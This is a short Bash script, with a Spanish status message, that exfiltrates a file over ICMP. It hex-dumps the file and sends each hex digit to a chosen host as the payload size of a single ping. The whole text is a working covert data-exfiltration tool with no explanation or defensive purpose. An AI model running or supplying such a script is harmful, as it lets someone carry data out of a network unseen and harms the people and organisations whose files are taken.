#!/bin/bash
file=$1
host=$2
xxd -p $file|tr -d '\n' | \
while read -n1 byte; do
	echo enviando $byte
	size=$(bc <<< "obase=10;ibase=16;${byte^^}");
	timeout 0.2 ping -c1 -s $size $host 2>&1 >/dev/null
done
